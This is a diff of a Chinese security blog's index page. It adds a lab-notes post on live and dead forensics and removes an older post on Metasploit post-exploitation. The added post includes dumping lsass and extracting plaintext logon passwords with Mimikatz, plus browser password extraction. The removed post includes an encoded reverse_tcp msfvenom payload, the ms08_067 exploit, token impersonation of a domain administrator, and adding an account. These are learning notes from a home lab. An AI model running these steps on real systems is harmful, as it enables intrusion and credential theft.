@@ -240,6 +240,379 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/03/04/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%80%E7%99%BE%E4%B8%80%E5%8D%81%E4%B8%83)%EF%BC%9A%E6%B4%BB%E5%8F%96%E8%AF%81%E5%92%8C%E6%AD%BB%E5%8F%96%E8%AF%81/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Tomas">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/photo.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Tomas'Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2020/03/04/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%80%E7%99%BE%E4%B8%80%E5%8D%81%E4%B8%83)%EF%BC%9A%E6%B4%BB%E5%8F%96%E8%AF%81%E5%92%8C%E6%AD%BB%E5%8F%96%E8%AF%81/" itemprop="url">Kali Linux笔记(一百一十七)：活取证和死取证</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-03-04T23:45:00+08:00">
+                2020-03-04
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Kali/" itemprop="url" rel="index">
+                    <span itemprop="name">Kali</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  1.4k 字
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  5 分钟
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <hr>
+<h4 id="1-活取证"><a href="#1-活取证" class="headerlink" title="1. 活取证"></a>1. 活取证</h4><ul>
+<li>▲ 2020.03.04 因为Win7 暂时无法拷贝文件出来，所以将实验机器换为Window XP SP3</li>
+<li>从内存还原文字<ul>
+<li>procdump：<a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump</a> <ul>
+<li>存在Linux版本，GitHub链接：<a href="https://github.com/Microsoft/ProcDump-for-Linux" target="_blank" rel="noopener">https://github.com/Microsoft/ProcDump-for-Linux</a></li>
+</ul>
+</li>
+<li>strings：<a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/strings" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/sysinternals/downloads/strings</a></li>
+<li><strong><code>🔺命令：procdump -ma notepad.exe notepad.dmp</code></strong>（记事本的进程）</li>
+<li><strong><code>🔺命令：strings notepad.dmp &gt; notepad.txt</code></strong>（只识别连续三个以上的ASCII码字符）</li>
+<li>其他文字处理程序也适用</li>
+</ul>
+</li>
+<li>从内存还原图片<ul>
+<li>远程桌面、画图工具、Virtualbox虚拟机（dump取虚拟机window XP SP3的图像）</li>
+<li><strong><code>🔺命令：volatility -f xp.raw --profile=WinXPSP3x86 memdump -p 1456 -D test</code></strong> </li>
+<li><strong><code>🔺命令：mv mstsc.dmp mstsc.data</code></strong></li>
+<li>Gimp -&gt; open -&gt; Raw Image Data -&gt; 调整参数</li>
+</ul>
+</li>
+<li>从内存中提取明文密码<ul>
+<li><strong><code>🔺命令：procdump.exe -ma lsass.exe lsa.dmp</code></strong></li>
+<li><strong><code>🔺命令：Mimikatz</code></strong> </li>
+<li><strong><code>🔺命令：sekurlsa::minidump lsass.dmp</code></strong> </li>
+<li><strong><code>🔺命令：sekurlsa::logonPasswords</code></strong> </li>
+</ul>
+</li>
+<li>Volatility的mimikatz插件<ul>
+<li><a href="https://github.com/sans-dfir/sift-files/blob/master/volatility/mimikatz.py" target="_blank" rel="noopener">https://github.com/sans-dfir/sift-files/blob/master/volatility/mimikatz.py</a></li>
+</ul>
+</li>
+<li>Firefox浏览器审计工具<ul>
+<li><strong><code>🔺命令：dumpzilla /root/.mozilla/firefox/bvpenhsu.default/ --All</code></strong></li>
+</ul>
+</li>
+</ul>
+<h4 id="2-实验–从内存还原文字"><a href="#2-实验–从内存还原文字" class="headerlink" title="2. 实验–从内存还原文字"></a>2. 实验–从内存还原文字</h4><ul>
+<li>Window XP SP3<ul>
+<li>拷贝procdump到window XP SP3上</li>
+<li>找一段文字写入notepad中，<strong><code>🔺命令：netstat -nao</code></strong>查看进程是否有notepad.exe</li>
+<li><strong><code>🔺命令：procdump.exe -ma notepad.exe notepad.dmp</code></strong></li>
+<li><strong><code>🔺命令：strings.exe notepad.dmp &gt; notepad.txt</code></strong></li>
+<li>对比两个文件的内容，是否存在相同（搜索特征字符）</li>
+</ul>
+</li>
+</ul>
+<h4 id="3-实验–从内存还原图片"><a href="#3-实验–从内存还原图片" class="headerlink" title="3. 实验–从内存还原图片"></a>3. 实验–从内存还原图片</h4><ul>
+<li>▲ 图片不同于图像，图像在软件中保存后，可以导出为图片</li>
+<li>Window XP SP3<ul>
+<li>截图工具 → 随意截取一张图片 → 保存图片到桌面 → 用画图工具打开</li>
+<li><strong><code>🔺命令：cmd → tasklist</code></strong><ul>
+<li>在Window XP SP3上暂不能执行此命令</li>
+</ul>
+</li>
+<li><strong><code>🔺命令：procdump.exe -ma mspaint.exe mspaint.dmp</code></strong></li>
+<li>Win+R → mstsc → 远程连接一个机器</li>
+<li><strong><code>🔺命令：cmd → tasklist</code></strong></li>
+<li><strong><code>🔺命令：procdump.exe -ma mstsc.exe mstsc.dmp</code></strong></li>
+</ul>
+</li>
+<li>Kali<ul>
+<li>从共享文件中拷贝mspaint.dmp和mstsc.dmp文件</li>
+<li><strong><code>🔺命令：apt-get install gimp</code></strong></li>
+<li>打开gimp</li>
+<li><strong><code>🔺命令：mv mspaint.dump mspaint.data</code></strong></li>
+<li><strong><code>🔺命令：mv mstsc.dump mstsc.data</code></strong></li>
+<li>gimp打开mstsc.data/mspaint.data</li>
+<li>调整Offset、Width、Height（高度一般不起作用，宽度一般其决定作用）</li>
+<li>▲ 2020.03.04 gimp通过滑块去移动会导致软件崩溃，只能通过值输入</li>
+</ul>
+</li>
+</ul>
+<p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=48e45Bke8q0F7yArsOLuB5_Yhnsd2bWW4p_mrI1lHPTmdWxeUjl8P05D19Ms78xY2oAQJAC8maImTmwiImGSelIJMfRreJTtDy4jHe-4zHz4sXGQ44AgABhcQWqwQi1OQPxlwcrzbw&file_name=/gimp%E6%89%93%E5%BC%80%E5%86%85%E5%AD%98%E5%9B%BE%E7%89%87.png" alt="gimp打开内存图片"></p>
+<h4 id="4-实验–从内存提取明文密码"><a href="#4-实验–从内存提取明文密码" class="headerlink" title="4. 实验–从内存提取明文密码"></a>4. 实验–从内存提取明文密码</h4><ul>
+<li>Window XP SP3<ul>
+<li><strong><code>🔺命令：procdump.exe -ma lsass.exe lsa.dmp</code></strong></li>
+</ul>
+</li>
+<li>Kali<ul>
+<li><strong><code>🔺命令：cd /usr/share/mimikatz</code></strong></li>
+<li>压缩mimikatz x86为一个x86.zip文件</li>
+</ul>
+</li>
+<li>Window XP SP3<ul>
+<li>拷贝.x86到window XP SP3的机子上</li>
+<li>双击mimikatz打开</li>
+<li><strong><code>🔺命令：sekurlsa::</code></strong></li>
+<li><strong><code>🔺命令：sekurlsa::minidump lsa.dmp</code></strong></li>
+<li><strong><code>🔺命令：sekurlsa::logonPasswords</code></strong></li>
+<li>查看dump下来的身份信息</li>
+</ul>
+</li>
+</ul>
+<p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=cc53U-yoem8lUfoxmFbu2wXynjsFjLnBwEC3Si4GrjvAMVZi0GehgaJnJJSuvMt_a-86ajRPPkZdq5V6hdfOsLik7IbdzMRDgcpHfelW-f6eQWU0YlWGthKivPxBASWwcl_CdYKKhurBl9LH0eE&file_name=/logonPasswords%E7%9A%84%E8%BA%AB%E4%BB%BD%E4%BF%A1%E6%81%AF.png" alt="logonPasswords的身份信息"></p>
+<h4 id="5-实验–Volatility的mimikatz插件"><a href="#5-实验–Volatility的mimikatz插件" class="headerlink" title="5. 实验–Volatility的mimikatz插件"></a>5. 实验–Volatility的mimikatz插件</h4><ul>
+<li>Kali<ul>
+<li>▲ 2020.03.04 Github的链接失效，暂无法找到mimikatz.py，此模块未实验</li>
+<li>从共享文件夹拷贝window XP SP3的内存映像xp.raw到Kali上</li>
+<li>从Github上下载mimikatz插件到volatility的plugins库中</li>
+<li><strong><code>🔺命令：volatility -f xp.raw imageinfo</code></strong></li>
+<li><strong><code>🔺命令：volatility -f xp.raw --profile==WindowXPSP3x86 mimikatz</code></strong></li>
+<li>查看是否拿到密码</li>
+</ul>
+</li>
+</ul>
+<h4 id="6-实验–Firefox浏览器审计工具"><a href="#6-实验–Firefox浏览器审计工具" class="headerlink" title="6. 实验–Firefox浏览器审计工具"></a>6. 实验–Firefox浏览器审计工具</h4><ul>
+<li>▲ 在未关机的情况下取证，找寻firefox使用的浏览信息</li>
+<li>Kali<ul>
+<li><strong><code>🔺命令：dumpzilla /root/.mozilla/firefox/bvpenhsu.default/ --Passwords</code></strong>（目录可能不一样）</li>
+<li>查看是否可看到浏览器信息</li>
+</ul>
+</li>
+<li>▲ 2020.03.04 –All参数被去除</li>
+</ul>
+<h4 id="7-死取证"><a href="#7-死取证" class="headerlink" title="7. 死取证"></a>7. 死取证</h4><ul>
+<li>硬盘镜像<ul>
+<li>使用Kali光盘启动计算机创建硬盘镜像文件（位镜像的拷贝）</li>
+<li>留足存储镜像文件的存储空间</li>
+<li>Dc3dd（来自美国空军计算机犯罪中心）</li>
+<li>Dcfldd</li>
+<li>Guymager</li>
+<li>计算机取证技术参考数据集<ul>
+<li><a href="http://www.cfreds.nist.gov/Controlv1_0/control.dd" target="_blank" rel="noopener">http://www.cfreds.nist.gov/Controlv1_0/control.dd</a></li>
+</ul>
+</li>
+<li>DFF（Digital Forensics Framework）<ul>
+<li>Open Evidence  #红色表示已经删除的文件</li>
+<li>▲ Kali官方已经剔除DFF软件，也无法手动安装，只能去官网手动安装包下载</li>
+</ul>
+</li>
+<li>Autopsy<ul>
+<li>非常流行的硬盘镜像分析工具</li>
+<li>WebServer+客户端架构</li>
+</ul>
+</li>
+<li>Extundelete<ul>
+<li>适用于ext3、ext4文件系统的反删除工具</li>
+<li><strong><code>🔺命令：Extundelete [device-file] --restore-file [restore location]</code></strong> </li>
+</ul>
+</li>
+<li>iPhone Backup Analyzer<ul>
+<li>分析iTunes生成的iPhone手机备份文件，并非电话image</li>
+</ul>
+</li>
+<li>Foremost（美国开发）<ul>
+<li>从内存dump中恢复文档图片，支持raw、dd、iso、vmem、excel、doc等格式（图片非图像）</li>
+<li><strong><code>🔺命令：foremost -t jpeg,gif,png,doc -i 7.raw</code></strong></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="8-实验–Guymager"><a href="#8-实验–Guymager" class="headerlink" title="8. 实验–Guymager"></a>8. 实验–Guymager</h4><ul>
+<li>Window 7光盘挂载Kali Linux，forensic mode启动（取证模式）</li>
+<li>启动Guymager（可能无发现硬盘，可以进行选择扫描尝试）</li>
+<li>选择要取证的硬盘 → 右键 → Acquire images<ul>
+<li>Linux dd raw image/Expert Withess Format,sub-format Guymager</li>
+<li>▲ 可以分成多个文件，并设置MD5/SHA-1/SHA-256的哈希验证</li>
+<li>Case Number 999（钥匙数字）</li>
+<li>Evidence Number 001（证据编号）</li>
+<li>Examiner mzt（证据人）</li>
+<li>Description server（描述）</li>
+<li>Image directory（保存路径）</li>
+<li>image filename（文件名）</li>
+<li>info filename（信息文件名）</li>
+</ul>
+</li>
+<li>Start</li>
+</ul>
+<p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=b530q0aJH5AM4mNQlrn-PR6sLYorGWiNy4-8AagL83_hKfdBeuyz-PbjcwbuRBCyTynYga6NWvnuXNew1n1lV8Y70cVCSlNJrhXlohJUe_HlBIqbMH2Jr0VUmDFNEk0&file_name=/Guymager%E5%8F%96%E8%AF%81.png" alt="Guymager取证"></p>
+<h4 id="9-实验–Autopsy"><a href="#9-实验–Autopsy" class="headerlink" title="9. 实验–Autopsy"></a>9. 实验–Autopsy</h4><ul>
+<li>Kali<ul>
+<li>▲ 2020.03.04 无法拷贝到control.dd文件，输入网址出现乱码</li>
+<li>拷贝准备好的control.dd文件到/root目录下</li>
+<li>autopsy启动服务端</li>
+<li>浏览器访问：<a href="http://localhost:9999/autopsy" target="_blank" rel="noopener">http://localhost:9999/autopsy</a></li>
+<li>NEW CASE → 添加信息（Case Name、Description、Investigator）→ NEW CASE</li>
+<li>ADD HOST → 填写主机信息</li>
+<li>ADD IMAGE → 镜像文件信息（Location、Type(分区还是整盘)、Import Method(一般为copy，move怕断电，Symlink怕移动链接失效)）</li>
+<li>Next → Data Integrity（镜像文件的MD5的计算）→ File System Details → ADD</li>
+<li>OK</li>
+<li>ANALYZE（一般位FILE ANALYSNS）→ 可对文件进行一定的还原</li>
+</ul>
+</li>
+</ul>
+<h4 id="10-实验–Foremost"><a href="#10-实验–Foremost" class="headerlink" title="10. 实验–Foremost"></a>10. 实验–Foremost</h4><ul>
+<li>Kali<ul>
+<li>▲ 2020.03.04 因为Win7 暂时无法拷贝文件出来，所以将实验机器换为Window XP SP3</li>
+<li>从共享文件夹拷贝window XP SP3的内存映像xp.raw到Kali上</li>
+<li><strong><code>🔺命令：foremost -t jpeg,gif,png,doc -i xp.raw</code></strong></li>
+<li>output文件夹中查看提取的文件</li>
+</ul>
+</li>
+</ul>
+<h4 id="11-网络取证"><a href="#11-网络取证" class="headerlink" title="11. 网络取证"></a>11. 网络取证</h4><ul>
+<li>▲ 网络取证请看&lt;&lt;协议分析&gt;&gt;<ul>
+<li>全流量镜像可以还原历史</li>
+</ul>
+</li>
+</ul>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/03/04/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%80%E7%99%BE%E4%B8%80%E5%8D%81%E5%85%AD)%EF%BC%9A%E5%8F%96%E8%AF%81%E5%B7%A5%E5%85%B7--Volatility/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -3052,309 +3425,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/03/03/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%80%E7%99%BE%E9%9B%B6%E5%85%AB)%EF%BC%9AMSF%E5%90%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--Token%E6%8F%90%E6%9D%83/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Tomas">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/photo.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Tomas'Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2020/03/03/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%80%E7%99%BE%E9%9B%B6%E5%85%AB)%EF%BC%9AMSF%E5%90%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--Token%E6%8F%90%E6%9D%83/" itemprop="url">Kali Linux笔记(一百零八)：MSF后渗透测试--Token提权</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-03-03T15:31:17+08:00">
-                2020-03-03
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Kali/" itemprop="url" rel="index">
-                    <span itemprop="name">Kali</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-                
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-file-word-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">字数统计&#58;</span>
-                
-                <span title="字数统计">
-                  785 字
-                </span>
-              
-
-              
-                <span class="post-meta-divider">|</span>
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
-                
-                <span title="阅读时长">
-                  3 分钟
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <hr>
-<h4 id="1-Msf后渗透测试阶段"><a href="#1-Msf后渗透测试阶段" class="headerlink" title="1. Msf后渗透测试阶段"></a>1. Msf后渗透测试阶段</h4><ul>
-<li>已经获得目标系统控制权后扩大战果<ul>
-<li>提权</li>
-<li>信息收集</li>
-<li>渗透内网</li>
-<li>永久后门</li>
-</ul>
-</li>
-<li>实验环境<ul>
-<li>Window 7<ul>
-<li>网卡模式为Bridge模式，检查网络，<strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
-<li>关闭防火墙</li>
-</ul>
-</li>
-<li>Kali<ul>
-<li>网卡模式为Bridge模式，检查网络，<strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-<h4 id="2-基于已有session扩大战果"><a href="#2-基于已有session扩大战果" class="headerlink" title="2. 基于已有session扩大战果"></a>2. 基于已有session扩大战果</h4><ul>
-<li>Kali<ul>
-<li><strong><code>🔺命令：msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=Kali的IP LPORT=4444 -b &quot;\x00&quot; -e x86/shikata_ga_nai -i 7 -f exe -o 1.exe</code></strong></li>
-<li><strong><code>🔺命令：service apache2 start</code></strong></li>
-<li><strong><code>🔺命令：cp 1.exe /var/www/html</code></strong></li>
-<li><strong><code>🔺命令：msfconsole -q</code></strong></li>
-<li><strong><code>🔺命令：use exploit/multi/handler</code></strong><ul>
-<li><strong><code>🔺命令：set payload windows/meterpreter/reverse_tcp</code></strong></li>
-<li><strong><code>🔺命令：set LHOST Kali的IP</code></strong></li>
-<li><strong><code>🔺命令：exploit</code></strong></li>
-</ul>
-</li>
-</ul>
-</li>
-<li>Window 7<ul>
-<li>浏览器访问<a href="http://Kali的IP，下载保存1.exe" target="_blank" rel="noopener">http://Kali的IP，下载保存1.exe</a></li>
-<li>双击打开1.exe</li>
-</ul>
-</li>
-<li>Kali<ul>
-<li>查看是否拿到shell</li>
-<li><strong><code>🔺命令：session -l</code></strong></li>
-</ul>
-</li>
-</ul>
-<h4 id="3-获取system账号权限"><a href="#3-获取system账号权限" class="headerlink" title="3. 获取system账号权限"></a>3. 获取system账号权限</h4><ul>
-<li>Kali<ul>
-<li><strong><code>🔺命令：load priv</code></strong> </li>
-<li><strong><code>🔺命令：getsystem</code></strong> <ul>
-<li>priv_elevate_getsystem: Operation failed: Access is denied. </li>
-<li>priv_elevate_getsystem: Operation failed: The enviroment is incorrect.</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-<h4 id="4-Token提权"><a href="#4-Token提权" class="headerlink" title="4. Token提权"></a>4. Token提权</h4><ul>
-<li>Tokens<ul>
-<li>用户每次登陆，账号绑定临时的Token</li>
-<li>访问资源时提价Token进行身份验证，类似于WEB Cookie</li>
-<li>Delegate Token：交互登陆会话（windowd的登陆界面、远程桌面）</li>
-<li>Impersonate Token：非交互登陆会话（SMB协议访问文件共享目录）</li>
-<li>Delegate Token：账号注销后变为Impersonate Token，权限依然有效<ul>
-<li>▲ 域管理员登陆注销后，依然依存这Token</li>
-</ul>
-</li>
-</ul>
-</li>
-<li>Incognito<ul>
-<li>独立功能的软件，被MSF集成在meterpreter中</li>
-<li>无需密码破解或获取密码HASH，窃取Token将自己伪装成其他用户</li>
-<li>尤其适用于域环境下提权渗透多操作系统</li>
-</ul>
-</li>
-<li>搭建域环境<ul>
-<li>▲ 2020.03.03 因搭建实验环境需要重启启动机器+硬盘空间所剩不足+XP和2003的有效期已经过了，故这次实验先暂且放一放</li>
-<li>Window Server 2003<ul>
-<li>配置静态IP地址，DNS服务器指向自己</li>
-<li>运行域程序的安装：dcpromo（安装过程需要光盘）</li>
-<li>DNS全名：lab.com</li>
-<li>重新启动服务器</li>
-<li>分配域账号（无本地用户） → dsa.msc → lab.com → Users → 右键 → 新建普通用户u1 → 设置账户密码（域的密码要复杂，需包含大写字母，小写字母，数字，特殊字符其中三种，且长度长于7个字符）</li>
-</ul>
-</li>
-<li>Window XP SP3<ul>
-<li>关闭防火墙 → 配置静态IP地址（DNS指向域控制器）</li>
-<li>我的电脑 → 右键 → 属性 → 高级系统设置 → 计算机名 → 更改 → 指定域（lab.com）</li>
-<li>重新启动机器</li>
-<li>用域账号Administrator登陆，关闭防火墙</li>
-<li>再用域账号u1登陆</li>
-</ul>
-</li>
-<li>Window Server 2003<ul>
-<li>Win+R → \Window XP SP3的IP\c$ → 进行操作</li>
-</ul>
-</li>
-<li>Kali<ul>
-<li><strong><code>🔺命令：use exploit/windows/smb/ms08_067_netapi</code></strong><ul>
-<li><strong><code>🔺命令：set payload windows/meterpreter/reverse_tcp</code></strong><ul>
-<li><strong><code>🔺命令：set LHOST Kali的IP</code></strong></li>
-</ul>
-</li>
-<li><strong><code>🔺命令：set RHOST Window XP SP3的IP</code></strong></li>
-<li><strong><code>🔺命令：set target 34</code></strong></li>
-<li><strong><code>🔺命令：exploit</code></strong></li>
-</ul>
-</li>
-<li><strong><code>🔺命令：getuid</code></strong></li>
-<li><strong><code>🔺命令：load incognito</code></strong><ul>
-<li>使用伪装Token需要提权为本地SYSTEM权限</li>
-<li>查看组的Token：<strong><code>🔺命令：list_tokens -u</code></strong></li>
-<li>伪装Token：<strong><code>🔺命令：impersonate_token lab\\administrator</code></strong></li>
-</ul>
-</li>
-<li><strong><code>🔺命令：getuid</code></strong></li>
-<li><strong><code>🔺命令：execute -f cmd.exe -i -t</code></strong> # -t：使用当前假冒token执行程序</li>
-<li><strong><code>🔺命令：shell</code></strong><ul>
-<li><strong><code>🔺命令：net user a a /add</code></strong>（增加账号尝试）</li>
-</ul>
-</li>
-</ul>
-</li>
-<li>▲ 本地普通权限用户需先本地提权<ul>
-<li><strong><code>🔺命令：use exploit/windows/local/ms10_015_kitrap0d</code></strong></li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -3409,7 +3479,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">155</span>
+                  <span class="site-state-item-count">156</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -3516,7 +3586,7 @@
     
       <span class="post-meta-item-text">Site words total count&#58;</span>
     
-    <span title="Site words total count">144.5k</span>
+    <span title="Site words total count">145.4k</span>
   
 </div>
 
